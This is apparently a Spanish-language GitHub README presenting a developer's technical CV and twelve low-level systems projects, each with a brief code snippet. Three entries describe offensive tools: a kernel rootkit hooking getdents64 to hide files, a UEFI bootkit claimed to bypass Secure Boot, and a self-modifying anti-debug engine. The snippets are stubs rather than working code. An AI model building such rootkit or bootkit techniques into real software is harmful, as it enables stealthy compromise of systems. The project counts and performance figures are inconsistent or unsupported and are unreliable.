# 🌈 Amelia Enora Marceline Chavez Barroso - Technical CV & Projects

<div align="center">

[![CV Live](https://img.shields.io/badge/CV-Live%20Demo-pink?style=for-the-badge&logo=github-pages)](http://enorastrokes.gilect.net/?i=1)
[![Projects](https://img.shields.io/badge/Projects-20%20Hardcore-red?style=for-the-badge&logo=c)](https://github.com/AmeliaDi/technical-cv)
[![Systems Programming](https://img.shields.io/badge/Focus-Systems%20Programming-brightgreen?style=for-the-badge&logo=linux)](http://enorastrokes.gilect.net/?i=1)

**🔥 Desarrolladora de Sistemas & Assembly | Especialista en Bajo Nivel**

### [📋 **VER CV TÉCNICO INTERACTIVO** 📋](http://enorastrokes.gilect.net/?i=1)

*Programación de sistemas, ciberseguridad, y algoritmos con demos en WebAssembly*

</div>

---

## 🎯 **Acerca de Este Repositorio**

Este repositorio contiene mi **CV técnico interactivo** con demos funcionales en WebAssembly, más una colección de **12 proyectos hardcore de sistemas** que demuestran mi experiencia en programación de bajo nivel, kernel development, ciberseguridad y optimización.

## 🌐 **CV Técnico Interactivo**

**🔗 Visita:** [enorastrokes.gilect.net](http://enorastrokes.gilect.net/?i=1)

### ✨ **Características del CV:**
- 🖥️ **Terminal Linux interactivo** - Navegación estilo shell
- 🔥 **Algoritmos en WebAssembly** - QuickSort, MergeSort, HeapSort, BogoSort
- 📊 **Visualizaciones matemáticas** - Fractales de Mandelbrot, FFT
- 🔐 **Scanner de seguridad** - Demo de pentesting en tiempo real
- 🌍 **Multiidioma** - Español, English, Français, ไทย, 日本語, 中文
- 📱 **Ultra-responsive** - Funciona en todos los dispositivos

### 🏆 **Certificaciones Destacadas:**
- **CISM** - Certified Information Security Manager
- **CISA** - Certified Information Systems Auditor  
- **CCNA** - Cisco Certified Network Associate
- **CEH** - Certified Ethical Hacker
- **OSCP** - Offensive Security Certified Professional
- **AWS Solutions Architect** - Associate Level

---

## 🔥 **Proyectos Hardcore de Sistemas**

### 🖥️ **1. AmeliaHV - Type-1 Bare Metal Hypervisor**
```c
// Intel VT-x hardware virtualization
static int install_vmx_hooks(void) {
    if (!check_vmx_support()) return -1;
    setup_vmcs();
    enable_vmx_operation();
    return 0;
}
```
**🎯 Función:** Hypervisor tipo 1 que opera directamente sobre hardware  
**💪 Tech Stack:** C, Intel VT-x, VMX, EPT, VPID  
**🚀 Logros:** Soporte multi-CPU, manejo de VM-Exit, virtualización asistida por hardware

### ⚡ **2. AmeliaJIT - High-Performance JIT Compiler**
```c
// SSA-based JIT compilation to x86-64
jit_function_t compile_to_native(ssa_context_t *ssa) {
    optimize_ssa(ssa);
    allocate_registers(ssa);
    return emit_x86_64(ssa);
}
```
**🎯 Función:** Compilador JIT que genera código x86-64 en tiempo de ejecución  
**💪 Tech Stack:** C, x86-64 Assembly, SSA Form, Register Allocation  
**🚀 Logros:** Optimización SSA, generación de código ejecutable, <500 ciclos de compilación

### 🕵️ **3. AmeliaRootkit - Advanced Kernel Rootkit**
```c
// Syscall hooking for stealth operations
static asmlinkage long hooked_sys_getdents64(const struct pt_regs *regs) {
    long ret = orig_sys_getdents64(regs);
    hide_malicious_files(ret);
    return ret;
}
```
**🎯 Función:** Rootkit LKM con capacidades de ocultación avanzadas  
**💪 Tech Stack:** C, Linux Kernel, Syscall Hooking, DKOM  
**🚀 Logros:** Ocultación de procesos/archivos, backdoors, evasión de detección  
**⚠️ Solo fines educativos**

### 🛡️ **4. AmeliaFirewall - eBPF/XDP Firewall**
```c
// High-performance packet filtering
SEC("xdp")
int amelia_firewall(struct xdp_md *ctx) {
    if (detect_ddos_pattern(ctx)) return XDP_DROP;
    return rate_limit_check(ctx) ? XDP_DROP : XDP_PASS;
}
```
**🎯 Función:** Firewall de alto rendimiento con procesamiento zero-copy  
**💪 Tech Stack:** eBPF, XDP, C, Zero-copy packet processing  
**🚀 Logros:** 10+ Gbps throughput, protección DDoS, rate limiting inteligente

### 🔐 **5. AmeliaCrypt - ChaCha20-Poly1305 Engine**
```assembly
; ChaCha20 quarter round in pure assembly
chacha_quarter_round:
    add     eax, ebx        ; a += b
    xor     edx, eax        ; d ^= a  
    rol     edx, 16         ; d <<<= 16
    add     ecx, edx        ; c += d
    ret
```
**🎯 Función:** Motor criptográfico con aceleración hardware  
**💪 Tech Stack:** x86-64 Assembly, AES-NI, ChaCha20, Poly1305  
**🚀 Logros:** Cifrado autenticado, optimización con instrucciones AES-NI

### 🧠 **6. AmeliaAlloc - SLUB Memory Allocator**
```c
// Cache-colored SLUB allocator
void *amelia_cache_alloc(cache_t *cache) {
    slab_t *slab = find_partial_slab(cache);
    void *obj = allocate_from_slab(slab);
    update_cache_coloring(cache);
    return obj;
}
```
**🎯 Función:** Allocador de memoria de alto rendimiento con cache coloring  
**💪 Tech Stack:** C, SLUB algorithm, NUMA awareness, Cache optimization  
**🚀 Logros:** 99.8% cache hit ratio, optimización NUMA, threading-safe

### 🌐 **7. AmeliaNet - Userspace TCP/IP Stack**
```c
// High-performance packet processing
void process_packet(uint8_t *packet, size_t len) {
    eth_header_t *eth = parse_ethernet(packet);
    if (eth->type == ETH_P_IP) {
        process_ip_packet(packet + ETH_HLEN);
    }
}
```
**🎯 Función:** Stack TCP/IP en userspace con DPDK  
**💪 Tech Stack:** C, DPDK, Zero-copy networking, Custom protocols  
**🚀 Logros:** Procesamiento zero-copy, alta performance, bypass del kernel

### 💾 **8. AmeliaUEFI - UEFI Bootkit**
```c
// UEFI boot service hooking
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    hook_boot_services(SystemTable);
    bypass_secure_boot();
    return EFI_SUCCESS;
}
```
**🎯 Función:** Research tool para bypass de Secure Boot  
**💪 Tech Stack:** C, UEFI, Boot service hooking  
**🚀 Logros:** Manipulación del proceso de boot, research de seguridad  
**⚠️ Solo fines de investigación**

### 🎮 **9. AmeliaGPU - Minimal GPU Driver**
```c
// DRM/KMS GPU driver
static int amelia_gpu_probe(struct pci_dev *pdev, const struct pci_device_id *id) {
    struct drm_device *drm = drm_dev_alloc(&amelia_gpu_driver, &pdev->dev);
    return drm_dev_register(drm, 0);
}
```
**🎯 Función:** Driver GPU minimalista con DRM/KMS  
**💪 Tech Stack:** C, Linux Kernel, DRM/KMS, PCI development  
**🚀 Logros:** Abstracción de hardware gráfico, soporte PCI

### 🔧 **10. AmeliaOS - Microkernel**
```c
// CFS scheduler implementation  
process_t *pick_next_task(void) {
    return find_leftmost_vruntime(runqueue);
}
```
**🎯 Función:** Microkernel con scheduling CFS  
**💪 Tech Stack:** C, Process management, IPC, CFS scheduling  
**🚀 Logros:** Arquitectura microkernel, scheduling justo, IPC eficiente

### 🐛 **11. AmeliaDebug - Advanced Debugger**
```c
// ptrace-based debugging
int set_breakpoint(pid_t pid, unsigned long addr) {
    long orig = ptrace(PTRACE_PEEKTEXT, pid, addr, NULL);
    long trap = (orig & ~0xFF) | 0xCC;
    return ptrace(PTRACE_POKETEXT, pid, addr, trap);
}
```
**🎯 Función:** Debugger avanzado con ptrace  
**💪 Tech Stack:** C, ptrace, Disassembler, Breakpoints  
**🚀 Logros:** Debugging de procesos, análisis de instrucciones

### 🔄 **12. AmeliaSMC - Self-Modifying Code Engine**
```c
// Runtime code modification
void modify_code(void *addr, uint8_t *new_code, size_t len) {
    mprotect(addr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    memcpy(addr, new_code, len);
    mprotect(addr, 4096, PROT_READ | PROT_EXEC);
}
```
**🎯 Función:** Motor de código auto-modificable con anti-debug  
**💪 Tech Stack:** C, Runtime modification, Anti-debug techniques  
**🚀 Logros:** Código polimórfico, técnicas de evasión  
**⚠️ Solo fines educativos**

---

## 🎯 **Skills & Expertise**

### 💻 **Lenguajes de Programación**
- **C/C++** - Systems programming, memory management
- **Assembly** - x86/x64/ARM, NASM, FASM, MASM  
- **JavaScript** - WebAssembly, Node.js, V8 internals
- **Python** - Automation, pentesting, AI/ML
- **Rust** - Memory-safe systems programming

### 🔐 **Ciberseguridad**
- **Penetration Testing** - Kali Linux, Metasploit, Cobalt Strike
- **Network Security** - Wireshark, Nmap, Burp Suite
- **Binary Exploitation** - Buffer overflow, ROP chains
- **Malware Analysis** - IDA Pro, Ghidra, x64dbg
- **Forensics** - Memory dumps, Volatility, Autopsy

### 🐧 **Linux & Systems**
- **Kernel Development** - Modules, drivers, eBPF
- **Arch Linux** - AUR, pacman, custom builds
- **Virtualization** - QEMU/KVM, containers
- **Performance** - Profiling, optimization, debugging

---

## 📊 **Performance Metrics**

| Proyecto | Métrica de Rendimiento |
|----------|------------------------|
| **AmeliaFirewall** | 10+ Gbps throughput |
| **AmeliaJIT** | <500 ciclos compilación |
| **AmeliaAlloc** | 99.8% cache hit ratio |
| **AmeliaNet** | Zero-copy processing |
| **AmeliaHV** | <100ms tiempo de init |

---

## 🌟 **Cómo Explorar**

1. **🌐 Visita el CV interactivo:** [ameliadi.github.io/technical-cv](https://ameliadi.github.io/technical-cv/)
2. **🔍 Explora los algoritmos** - Demos en WebAssembly funcionando en tiempo real
3. **🖥️ Prueba el terminal** - Navegación estilo Linux shell
4. **📊 Ve las visualizaciones** - Fractales, FFT, y análisis matemático
5. **🔐 Ejecuta el scanner** - Demo de herramientas de ciberseguridad

---

## 📞 **Contacto**

<div align="center">

**Amelia Enora 🌈 Marceline Chavez Barroso**

[![Email](https://img.shields.io/badge/Email-enorastrokes%40gmail.com-red?style=for-the-badge&logo=gmail)](mailto:enorastrokes@gmail.com)
[![GitHub](https://img.shields.io/badge/GitHub-AmeliaDi-black?style=for-the-badge&logo=github)](https://github.com/AmeliaDi)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-bogosort-blue?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/bogosort)

**Especialista en Systems Programming | Assembly | Ciberseguridad | Linux Kernel**

</div>

---

<div align="center">

### 🚀 **[EXPLORAR CV TÉCNICO INTERACTIVO](http://enorastrokes.gilect.net/?i=1)** 🚀

*"La mejor manera de entender los sistemas es construirlos desde cero"*

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=AmeliaDi.technical-cv)

</div> 